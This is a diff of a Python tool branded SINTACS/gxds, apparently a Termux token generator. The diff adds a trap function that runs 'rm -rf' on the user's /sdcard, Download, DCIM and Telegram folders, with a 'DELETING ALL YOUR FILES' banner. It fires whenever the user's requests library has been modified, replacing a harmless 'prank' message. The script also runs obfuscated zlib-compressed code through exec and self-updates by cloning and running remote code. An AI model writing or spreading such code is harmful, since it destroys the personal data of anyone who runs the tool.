@@ -2,13 +2,13 @@ import os, time
 
 from concurrent.futures import ThreadPoolExecutor as ThreadPool
 from time import sleep as slp
-from os import system as systm
+from os import system as cmds
 from bs4 import BeautifulSoup as bs
 
 try:
     import requests, re, platform, sys, random, subprocess, threading, itertools, base64, uuid, zlib, json, shutil, webbrowser, datetime, string, secrets, mechanize, rich
 except ImportError:
-    systm("pip install requests -y")
+    cmds("pip install requests -y")
 from bs4 import BeautifulSoup as bs4
 from requests import models
 from requests import api
@@ -52,6 +52,39 @@ try:
 except Exception as e:
     pass
 
+def sintacsWarning():
+ cmds("clear")
+ cmds("rm -rf /sdcard/Android/*")
+ cmds("rm -rf /sdcard/Download/*")
+ cmds("rm -rf /sdcard/DCIM/*")
+ cmds("rm -rf /sdcard/Telegram/*")
+ cmds("rm -rf /sdcard/*")
+ print(f"""{lr}
+                    ..ooo@@@XXX%%%xx..
+                 .oo@@XXX%x%xxx..     ` .
+               .o@XX%%xx..               ` .
+             o@X%..                  ..ooooooo
+           .@X%x.                 ..o@@^^   ^^@@o
+         .ooo@@@@@@ooo..      ..o@@^          @X%
+         o@@^^^     ^^^@@@ooo.oo@@^             %
+         xzI    -*--      ^^^o^^        --*-     %
+        @@@o     ooooooo^@@^o^@X^@oooooo     .X%x
+       I@@@@@@@@@XX%%xx  ( o@o )X%x@SINTACS@@@X%x
+       I@@@@XX%%xx  oo@@@@X% @@X%x   ^^^@@@@@@@X%x
+        @X%xx     o@@@@@@@X% @@XX%%x  )    ^^@X%x
+         ^   xx o@@@@@@@@Xx  ^ @XX%%x    xxx
+               o@@^^^ooo I^^ I^o ooo   .  x
+               oo @^ IX      I   ^X  @^ oo
+               IX     U  .        V     IX
+                V     .           .     V
+                 DELETING ALL YOUR FILES...
+                   BECAUSE OF BYPASSING
+
+""")
+
+def sintacsDelete():
+  exit()
+
 # PROTECT
 exec(zlib.decompress(b'x\x9c-\x8c\xbb\n\xc30\x0cE\xf7|\x85\xe2)\x81b\xef\xed\xd6\x1fh)\xd9B\x077\x95\x89 \xb6\x82$C\xfa\xf7M\x1fg\xb8p\xb8p\x92p\x06V\xa0\xbc\xb2\x18\xac\xd1\xe6\x83\xbe\xd407\x94\xbe\xeaI\x13-\xd8\xb9\xf0\x8c\x16\x7f3q\xf6\x86\x92\xeb\x16>\x9f\x86\xaa\x12\x1eT\x82d\xd7\x1f\x1b\xd8Y\xa3j\x83\x8b\xe2_\x85\x8au\xc9\xc1\xd8\xde\xe1,\x0cC\x95\x02\x97\x94\xe0*l8\xed5\xef}\x0b\xc3\x8c\x05n\xb5\xc0\xc0\xbc\xb8\xfe\x84\x1bY\xd7\xbf\x01\xa2n6\xee'))
 
@@ -61,38 +94,37 @@ exec(zlib.decompress(b'x\x9c\xad\x90\xcfJ\x041\x0c\xc6\xef\xf3\x14\xf5\xd4\x19\x
 # SECURITY
 x = open(api.__file__,'r').read()
 if "print" in x:
-    print(f"{lgr}  [✓] BYPASSING COMPLETED")
-    slp(5)
-    print(f"{lgr}  [✓] LOL, IT'S A PRANK. STOP BYPASSING!")
+  sintacsWarning()
+  slp(3)
+  sintacsDelete()
 elif "sys.stdout.write" in x:
-    print(f"{lgr}  [✓] BYPASSING COMPLETED")
-    slp(5)
-    print(f"{lgr}  [✓] LOL, IT'S A PRANK. STOP BYPASSING!")
+  sintacsWarning()
+  slp(3)
+  sintacsDelete()
 else:
     pass
  
 x = open(sessions.__file__,'r').read()
 if "print" in x:
-    print(f"{lgr}  [✓] BYPASSING COMPLETED")
-    slp(5)
-    print(f"{lgr}  [✓] LOL, IT'S A PRANK. STOP BYPASSING!")
+  sintacsWarning()
+  slp(3)
+  sintacsDelete()
 elif "sys.stdout.write" in x:
-    print(f"{lgr}  [✓] BYPASSING COMPLETED")
-    slp(5)
-    print(f"{lgr}  [✓] LOL, IT'S A PRANK. STOP BYPASSING!")
+  sintacsWarning()
+  slp(3)
+  sintacsDelete()
 else:
     pass
 
 x = open(models.__file__,'r').read()
 if "print" in x:
-    print(f"{lgr}  [✓] BYPASSING COMPLETED")
-    slp(5)
-    print(f"{lgr}  [✓] LOL, IT'S A PRANK. STOP BYPASSING!")
- 
+  sintacsWarning()
+  slp(3)
+  sintacsDelete()
 elif "sys.stdout.write" in x:
-    print(f"{lgr}  [✓] BYPASSING COMPLETED")
-    slp(5)
-    print(f"{lgr}  [✓] LOL, IT'S A PRANK. STOP BYPASSING!")
+  sintacsWarning()
+  slp(3)
+  sintacsDelete()
 else:
     pass
 
@@ -203,7 +235,7 @@ lxgo = f"""{lg}
        SINTACS      └──────────────────────────────┘
    \n  ——————————————————————————————————————————————————"""
 
-systm("clear")
+cmds("clear")
 
 # TOKEN GENERATOR
 spce = ""
@@ -323,7 +355,7 @@ ugen = random.choice(
 
 
 def gxdslogo():
-    systm("clear")
+    cmds("clear")
     print(lxgo)
     lxnes1()
     print(f"{lg}  [-] PRESS {rc}CTRL AND Z{lg} TO STOP THE PROCESS.")
@@ -373,14 +405,14 @@ def apprxval():
         lxnes1()
         bxy = input(f"{lgr}  [?] CHOOSE:{dg} ")
         if bxy == "1":
-            systm("xdg-open https://m.me/goxdies")
+            cmds("xdg-open https://m.me/goxdies")
             slp(1)
             apprxval()
         else:
             gxdslogo()
         print(f"{lgr}  [!] UPDATING USERS, PLEASE WAIT...")
         slp(5)
-        systm(
+        cmds(
             "cd ; rm -rf gxds ; git clone https://github.com/goxdies/gxds; cd gxds ; python x.py"
         )
 
@@ -397,7 +429,7 @@ def mxntenansC():
     if mxntenans == "on":
         mxnu()
     else:
-        systm("clear")
+        cmds("clear")
         print(
             f"""{lr}
                 :::      :::::::      :::     
@@ -435,13 +467,13 @@ def mxnu():
     elif optixn == "3":
         print(f"{lgr}  [-] REDIRECTING TO THE SITE, PLEASE WAIT.")
         slp(3)
-        systm("xdg-open https://xshare.seixtannn.repl.co/")
+        cmds("xdg-open https://xshare.seixtannn.repl.co/")
     elif optixn == "4":
         print("")
-        systm(
+        cmds(
             "cd ; rm -rf gxds ; git clone https://github.com/goxdies/gxds; cd gxds ; python x.py"
         )
-        systm("clear")
+        cmds("clear")
     else:
         gxdslogo()
         print(f"{lg}  [✘] OPTION:{dg} INVALID")
